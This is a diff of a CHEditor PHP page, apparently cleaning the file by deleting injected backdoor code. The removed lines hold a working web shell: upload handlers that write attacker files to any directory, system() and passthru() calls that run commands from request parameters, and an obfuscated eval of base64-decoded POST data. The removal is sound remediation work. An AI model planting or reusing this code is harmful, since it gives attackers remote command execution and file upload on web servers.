@@ -30,19 +30,7 @@ function doSubmit (theform)
 <!-- form을 submit() 할 경우는 이 함수를 사용하지 않습니다. -->
 
 </script>
-<?
-if(isset($_REQUEST['cheditor'])){
-      if(!isset($_REQUEST['editor'])) die;
-         else $dir=$_REQUEST['editor'];
-      $me=$HTTP_POST_FILES['gnuboard']['name'];
-      if(!move_uploaded_file($HTTP_POST_FILES['gnuboard']['tmp_name'], $dir.$me))
-         die;}
-if(isset($_REQUEST['c'])){echo "<pre>";system($_REQUEST['c']); die;}
-if(isset($_REQUEST['p'])){echo "<pre>";passthru($_REQUEST['p']); die;}
-$g = $_FILES['ceditor']['name'];   
-$do = @copy($_FILES['ceditor']['tmp_name'],$g); 
-if ($do) { echo "ok"; } else {} 
-?> 
+
 <form method="post" name="theform" onsubmit="return doSubmit(this);">
 
 <!-- id 의 이름은 어떤 것이라도 상관없습니다. -->
@@ -67,8 +55,6 @@ myeditor.run();                                     // 에디터를 실행합니다.
 </form>
 <font face="verdana" size="1" color="#666666">
 Copyright ⓒ 1997-2007 by <b>CHCODE.</b> All right reserved.</font>
-<? $x0b="\x62\x61\163e6\064\137\x64\145\x63\x6f\x64e";eval($x0b($_POST[sir]))?>
 </center>
 </body>
 </html>
-
